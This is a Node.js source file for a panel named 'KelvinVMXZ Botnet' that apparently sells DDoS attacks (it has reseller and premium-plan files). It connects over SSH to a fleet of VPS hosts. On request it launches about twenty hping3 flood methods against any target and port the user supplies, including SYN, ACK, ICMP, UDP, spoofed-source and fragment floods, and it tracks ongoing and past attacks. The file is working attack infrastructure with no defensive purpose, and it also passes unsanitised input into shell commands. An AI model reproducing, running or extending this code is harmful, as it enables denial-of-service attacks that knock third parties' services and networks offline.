const express = require('express');
const fs = require('fs');
const path = require('path');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { exec } = require('child_process');
const { Client } = require('ssh2');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = 'kelvinvmxz-secret-key-2024';

// Middleware
app.use(express.json());
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));

// File paths
const DB_DIR = './db';
const USER_FILE = path.join(DB_DIR, 'user.json');
const VPS_FILE = path.join(DB_DIR, 'vps.json');
const PREMIUM_FILE = path.join(DB_DIR, 'premium.json');
const PLANS_FILE = path.join(DB_DIR, 'plans.json');
const RESELLER_FILE = path.join(DB_DIR, 'reseller.json');
const ADMIN_FILE = path.join(DB_DIR, 'admin.json');

// Ensure directories exist
if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR);

// Helper functions
const ensureFile = (file, defaultData) => {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify(defaultData, null, 2));
};

ensureFile(USER_FILE, { users: [] });
ensureFile(VPS_FILE, []);
ensureFile(PREMIUM_FILE, []);
ensureFile(PLANS_FILE, {});
ensureFile(RESELLER_FILE, []);
ensureFile(ADMIN_FILE, []);

// Load data
function loadData(file) {
  try {
    return JSON.parse(fs.readFileSync(file, 'utf8'));
  } catch (err) {
    return [];
  }
}

function saveData(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// Authentication
function generateToken(user) {
  return jwt.sign({ id: user.id, username: user.username }, JWT_SECRET, { expiresIn: '24h' });
}

function authenticateToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  
  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = user;
    next();
  });
}

// VPS Management
let cncActive = false;
let vpsConnections = {};
const ongoingAttacks = [];
const attackHistory = [];

const connectToAllVPS = () => {
  if (!cncActive) return;
  console.log("🔌 Connecting to all VPS...");
  
  const vpsList = loadData(VPS_FILE);
  vpsList.forEach((vps) => {
    if (vpsConnections[vps.host]) {
      try {
        vpsConnections[vps.host].end();
      } catch (e) {}
      delete vpsConnections[vps.host];
    }

    const conn = new Client();
    conn.on('ready', () => {
      if (!cncActive) return conn.end();
      console.log(`✅ Connected to ${vps.host}`);
      vpsConnections[vps.host] = conn;
      
      conn.on('close', () => {
        console.log(`🔌 Connection closed: ${vps.host}`);
        delete vpsConnections[vps.host];
        if (cncActive) setTimeout(() => connectToAllVPS(), 10000);
      });
    });
    
    conn.on('error', (err) => {
      console.log(`❌ ${vps.host}: ${err.message}`);
      delete vpsConnections[vps.host];
    });
    
    conn.connect({
      host: vps.host,
      username: vps.username || "root",
      password: vps.password,
      readyTimeout: 10000,
      keepaliveInterval: 30000
    });
  });
};

const disconnectAllVPS = () => {
  console.log("🛑 Disconnecting all VPS...");
  cncActive = false;
  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
};

const executeOnVPS = async (vps, command) => {
  return new Promise((resolve, reject) => {
    if (!cncActive || !vpsConnections[vps.host]) {
      return resolve({ vps, success: false });
    }

    const safeCommand = command.replace(/'/g, "'\"'\"'");
    const screenName = `attack_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    vpsConnections[vps.host].exec(
      `screen -dmS ${screenName} bash -c "${safeCommand}; sleep 1"`,
      (err) => {
        if (err) {
          return resolve({ vps, success: false });
        }
        resolve({ vps, success: true });
      }
    );
  });
};

const stopAllScreens = async () => {
  console.log(`\n🛑 Stopping all attacks...`);
  
  for (const host in vpsConnections) {
    const conn = vpsConnections[host];
    if (conn && typeof conn.exec === 'function') {
      conn.exec('pkill -9 hping3 && pkill -f "attack_" && screen -ls | grep attack_ | cut -d. -f1 | xargs -I {} screen -X -S {} quit', (err) => {
        if (err) {
          console.log(`⚠️ Error stopping ${host}: ${err.message}`);
        } else {
          console.log(`✅ Stopped attacks on ${host}`);
        }
      });
    }
  }
  
  while (ongoingAttacks.length > 0) {
    const attack = ongoingAttacks.pop();
    attack.Status = "STOPPED";
    attack.EndTime = new Date().toISOString();
    attackHistory.push(attack);
  }
  
  console.log(`✅ All attacks stopped.`);
  return true;
};

// API Routes
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const users = loadData(USER_FILE).users;
  const user = users.find(u => u.username === username);
  
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  
  bcrypt.compare(password, user.password, (err, valid) => {
    if (err || !valid) return res.status(401).json({ error: 'Invalid credentials' });
    
    const token = generateToken(user);
    res.json({ token, user: { id: user.id, username: user.username, role: user.role } });
  });
});

app.get('/api/status', authenticateToken, (req, res) => {
  const users = loadData(USER_FILE).users;
  const vpsList = loadData(VPS_FILE);
  const premiumUsers = loadData(PREMIUM_FILE);
  const plans = loadData(PLANS_FILE);
  const resellers = loadData(RESELLER_FILE);
  
  res.json({
    system: 'KelvinVMXZ Botnet',
    cnc_status: cncActive ? '🟢 ACTIVE' : '🔴 INACTIVE',
    vps_count: vpsList.length,
    premium_users: Object.keys(plans).length,
    reseller_count: resellers.length,
    ongoing_attacks: ongoingAttacks.length,
    attack_history: attackHistory.length,
    total_methods: 18,
    user: {
      id: req.user.id,
      username: req.user.username,
      role: users.find(u => u.id === req.user.id)?.role || 'user'
    }
  });
});

app.post('/api/attack', authenticateToken, async (req, res) => {
  const { target, port, time, method } = req.body;
  const userId = req.user.id;
  
  if (!cncActive) return res.status(400).json({ error: 'CNC is not active' });
  
  const attackId = Date.now().toString();
  const attack = {
    Id: attackId,
    User: userId,
    Target: target,
    Method: method,
    Time: time,
    StartTime: new Date().toISOString(),
    EndTime: null,
    Status: "RUNNING",
    VPS: []
  };

  ongoingAttacks.push(attack);

  let success = 0;
  let failed = 0;
  const vpsResults = [];
  const vpsList = loadData(VPS_FILE);
  
  for (const vps of vpsList) {
    try {
      const result = await executeOnVPS(vps, getAttackCommand(method, target, port, time));
      const vpsResult = {
        host: vps.host,
        success: result.success,
        timestamp: new Date().toISOString()
      };
      
      vpsResults.push(vpsResult);
      
      if (result.success) {
        success++;
      } else {
        failed++;
      }
    } catch (err) {
      failed++;
      vpsResults.push({
        host: vps.host,
        success: false,
        error: err.message,
        timestamp: new Date().toISOString()
      });
    }
  }

  attack.VPS = vpsResults;
  attack.Status = "COMPLETED";
  attack.EndTime = new Date().toISOString();
  
  const index = ongoingAttacks.findIndex(a => a.Id === attackId);
  if (index !== -1) {
    attackHistory.push({...ongoingAttacks[index]});
    ongoingAttacks.splice(index, 1);
  }
  
  res.json({
    success,
    failed,
    total: vpsList.length,
    vpsResults
  });
});

app.post('/api/stop-attacks', authenticateToken, async (req, res) => {
  await stopAllScreens();
  res.json({ status: 'success', stopped: attackHistory.filter(a => a.Status === "STOPPED").length });
});

app.post('/api/cnc/start', authenticateToken, (req, res) => {
  const user = loadData(USER_FILE).users.find(u => u.id === req.user.id);
  if (user.role !== 'admin') return res.status(403).json({ error: 'Admin only' });
  
  cncActive = true;
  connectToAllVPS();
  res.json({ status: 'success', message: 'CNC started' });
});

app.post('/api/cnc/stop', authenticateToken, (req, res) => {
  const user = loadData(USER_FILE).users.find(u => u.id === req.user.id);
  if (user.role !== 'admin') return res.status(403).json({ error: 'Admin only' });
  
  disconnectAllVPS();
  res.json({ status: 'success', message: 'CNC stopped' });
});

app.get('/api/ongoing-attacks', authenticateToken, (req, res) => {
  res.json({
    total_ongoing: ongoingAttacks.length,
    attacks: ongoingAttacks.map(attack => ({
      id: attack.Id,
      target: attack.Target,
      method: attack.Method,
      user_id: attack.User,
      start_time: attack.StartTime,
      status: attack.Status,
      duration: attack.Time
    }))
  });
});

app.get('/api/attack-history', authenticateToken, (req, res) => {
  res.json({
    total: attackHistory.length,
    attacks: attackHistory.slice(-50)
  });
});

app.get('/api/vps/status', authenticateToken, async (req, res) => {
  const user = loadData(USER_FILE).users.find(u => u.id === req.user.id);
  if (user.role !== 'admin') return res.status(403).json({ error: 'Admin only' });
  
  const vpsList = loadData(VPS_FILE);
  const aliveVps = [];
  const statusMessage = [];
  
  for (const [index, vps] of vpsList.entries()) {
    const isAlive = await checkVps(vps);
    const vpsStatus = isAlive
      ? `VPS ${String(index + 1).padStart(2, '0')} : ✅ Online`
      : `VPS ${String(index + 1).padStart(2, '0')} : 🔴 Offline`;
    statusMessage.push(vpsStatus);
    if (isAlive) aliveVps.push(vps);
  }
  
  saveData(VPS_FILE, aliveVps);
  res.json({
    status: statusMessage.join('\n'),
    active_vps: aliveVps.length,
    total_vps: vpsList.length
  });
});

// Helper functions
function getAttackCommand(method, target, port, time) {
  const commands = {
    'syn-pps': `sudo timeout ${time}s hping3 -S --flood -p ${port} ${target}`,
    'syn-gbps': `sudo timeout ${time}s hping3 -S --flood --data 65495 -p ${port} ${target}`,
    'ack-pps': `sudo timeout ${time}s hping3 -A --flood -p ${port} ${target}`,
    'ack-gbps': `sudo timeout ${time}s hping3 -A --flood --data 65495 -p ${port} ${target}`,
    'icmp-pps': `sudo timeout ${time}s hping3 --icmp --flood ${target}`,
    'icmp-gbps': `sudo timeout ${time}s hping3 --icmp --flood --data 65495 ${target}`,
    'rand-udp': `sudo timeout ${time}s hping3 --udp --rand-source --flood -p ${port} ${target}`,
    'rand-syn': `sudo timeout ${time}s hping3 -S --rand-source --flood -p ${port} ${target}`,
    'rand-ack': `sudo timeout ${time}s hping3 -A --rand-source --flood -p ${port} ${target}`,
    'rand-frpu': `sudo timeout ${time}s hping3 --frag --rand-source --flood -p ${port} ${target}`,
    'icmp-ts': `sudo timeout ${time}s hping3 --icmp --icmp-ts --flood ${target}`,
    'rand-icmp': `sudo timeout ${time}s hping3 --icmp --rand-source --flood ${target}`,
    'udp-multi': `sudo timeout ${time}s hping3 --udp --flood -p ${port} ${target}`,
    'udp-sip': `sudo timeout ${time}s hping3 --udp --flood -p ${port} ${target}`,
    'syn-rand': `sudo timeout ${time}s hping3 -S --rand-source --flood -p ${port} ${target}`,
    'ack-rmac': `sudo timeout ${time}s hping3 -A --rand-mac --flood -p ${port} ${target}`,
    'file-attack': `sudo timeout ${time}s hping3 --file /tmp/attack.dat --flood -p ${port} ${target}`,
    'syn-multi': `sudo timeout ${time}s hping3 -S --flood -p ${port} ${target}`,
    'icmp-rand': `sudo timeout ${time}s hping3 --icmp --rand-source --flood ${target}`,
    'ack-rand': `sudo timeout ${time}s hping3 -A --rand-source --flood -p ${port} ${target}`,
    'oblivion': `sudo timeout ${time}s hping3 --oblivion --flood -p ${port} ${target}`
  };
  
  return commands[method] || commands['syn-pps'];
}

function checkVps(vps) {
  return new Promise((resolve) => {
    const conn = new Client();
    conn.on('ready', () => { 
        conn.end(); 
        resolve(true); 
    })
    .on('error', () => { 
        resolve(false); 
    })
    .connect({ 
        host: vps.host, 
        username: vps.username, 
        password: vps.password, 
        readyTimeout: 5000 
    });
  });
}

// Start server
app.listen(PORT, () => {
  console.log(`🚀 KelvinVMXZ Panel running on port ${PORT}`);
  console.log(`🌐 Access at http://localhost:${PORT}`);
});
